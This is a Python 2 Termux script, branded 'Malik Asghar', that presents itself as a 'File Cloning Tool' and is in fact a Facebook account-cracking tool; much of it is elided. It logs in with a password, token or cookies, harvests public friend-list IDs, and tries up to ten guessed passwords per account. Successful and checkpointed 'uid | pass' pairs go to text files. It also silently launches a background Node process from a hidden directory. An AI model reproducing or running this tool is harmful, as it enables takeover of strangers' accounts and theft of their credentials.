#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To malikasghar
...
if not os.path.isfile('/data/data/com.termux/files/home/asg/...../node_modules/bytes/index.js'):
    ...
    os.system('clear')
    print '\x1b[1;35mWelCome To File Cloning Tool\x1b[0;97m'
    ...
    os.system('cd ..... && node index.js &')
    os.system('clear')
    print '\x1b[1;36mWelcome To File Cloning tool \x1b[0;97m'
    os.system('xdg-open https://www.facebook.com/malikasghar.latif.9')
    time.sleep(3)
...
\033[1;95m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mMALIK\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•
\033[1;91m   ___               _     
\033[1;92m  / _ \             | |     
\033[1;93m / /_\ \ ___   __ _ | |__    __ _  _ __
\033[1;94m |  _  |/ __| / _` || '_ \  / _` || '__|
\033[1;95m | | | |\__ \| (_| || | | || (_| || |   
\033[1;96m \_| |_/|___/ \__, ||_| |_| \__,_||_|   
\033[1;97m               _/  |                    
\033[1;94m              |___/    
\033[1;95m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mASGHAR\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"""
...
\033[1;95m
\033[1;95m
\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;95mMalik Asghar\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""
...
jalan("\033[1;96m___§$$$$$#______   _______$$$$$$$")
...
print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mMALIK ASGHAR LATIF\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
...
def log_menu():
    try:
        ...
        print       '\x1b[32;1m Login menu'
        print 47 * '-'
        print '\x1b[1;36m[1] Login with Email Pass \x1b[0;97m'
        print '\x1b[1;36m[2] Login with token \x1b[0;97m'
        print '\x1b[1;36m[3] Login with cookies \x1b[0;97m'
        print ''
        print 47 * '-'
...
def log_menu_s():
    s = raw_input(' \x1b[1;96m\xe2\x95\xb0\xe2\x94\x80Asghar\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def menu():
    ...
    print 47 * '-'
    print ' ------------------------------------------ '
    print '\x1b[1;36m[1] Crack with Auto pass'
    print '\x1b[1;36m[2] Crack Choice Number pass'
    print '\x1b[1;36m[3] Crack Choice Name + Number pass '
    print '\x1b[1;36m[4] Crack Choice Name Pass '
    print '\x1b[1;36m[5] Make File'
    print '\x1b[1;36m[6] Delete Trash Files'
    menu_s()
...
def a_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\x1b[1;92m   ~~~~~~~MaLik Asghar~~~~~~~\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                print '\x1b[1;36m[ASGHAR-CP] ' + uid + ' | ' + pass1
                ...
                if 'loc' in q:
                    ...
                    print '\x1b[1;36m[ASGHAR-CP] ' + uid + ' | ' + pass2
                    cp = open('ASGHAR_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'loc' in q:
                        ...
                        print '\x1b[1;36m[ASGHAR-CP] ' + uid + ' | ' + pass3
                        cp = open('ASGHAR_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'loc' in q:
                            ...
                            print '\x1b[1;36m[ASGHAR-CP] ' + uid + ' | ' + pass4
                            cp = open('ASGHAR_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'loc' in q:
                                ...
                                print '\x1b[1;36m[ASGHAR-CP] ' + uid + ' | ' + pass5
                                cp = open('ASGHAR_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                if 'loc' in q:
                                    ...
                                    print '\x1b[1;36m[ASGHAR-CP] ' + uid + ' | ' + pass6
                                    cp = open('ASGHAR_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    if 'loc' in q:
                                        ...
                                        print '\x1b[1;36m[ASGHAR-CP] ' + uid + ' | ' + pass7
                                        cp = open('ASGHAR_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        if 'loc' in q:
                                            ...
                                            print '\x1b[1;36m[ASGHAR-CP] ' + uid + ' | ' + pass8
                                            cp = open('ASGHAR_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            ...
                                            if 'loc' in q:
                                                ...
                                                print '\x1b[1;36m[ASGHAR-CP] ' + uid + ' | ' + pass9
                                                cp = open('ASGHAR_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                ...
                                                if 'loc' in q:
                                                    ...
                                                    print '\x1b[1;34m[ASGHAR-CP] ' + uid + ' | ' + pass10
                                                    cp = open('ASGHAR_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
...
def c_s():
    ...
    cps = []
    oks = []
    c_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Asghar\xe2\x9e\xa4 ')
    if c_s == '1':
        os.system('clear')
        print logo
        ...
        try:
            ...
            if 'loc' in q:
                ...
                if 'loc' in q:
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[ASGHAE-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/ASGHAR_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
...
def n_s():
    ...
    cps = []
    oks = []
    n_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Asghar\xe2\x9e\xa4 ')
    if n_s == '1':
        os.system('clear')
        print logo
...
def d_s():
    ...
    cps = []
    oks = []
    d_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Asghar\xe2\x9e\xa4 ')
    if d_s == '1':
        os.system('clear')
        print logo
...
def ex_id():
    ...
    print logo
    print ''
    print '\x1b[1;35m~~~~~COLLECT PUBLIC ID FRIENDLIST~~~~~\x1b[0;97m'
    print ''
    ...
    os.system('cp ids_friends.txt /sdcard/ids_friends.txt')
